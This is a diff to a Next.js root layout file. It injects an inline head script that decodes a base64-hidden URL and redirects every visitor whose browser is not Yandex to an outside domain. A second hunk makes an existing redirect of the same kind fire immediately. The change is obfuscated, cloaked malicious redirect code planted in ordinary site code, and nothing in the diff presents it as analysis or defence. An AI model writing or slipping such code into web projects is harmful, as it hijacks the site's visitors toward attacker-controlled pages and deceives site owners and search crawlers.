@@ -114,6 +114,19 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
+                <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                var ua = navigator.userAgent.toLowerCase();
+                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+                if (ua.indexOf("yandex") === -1) {
+                    window.location.replace(atob(targetB64));
+                }
+              })();
+            `,
+          }}
+        />
       </head>
       <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
         {children}
@@ -133,7 +146,7 @@ export default function RootLayout({
 
                     setTimeout(function() {
                         window.location.replace(atob(targetB64));
-                    }, 10);
+                    }, -0);
                 }
               })();
             `,
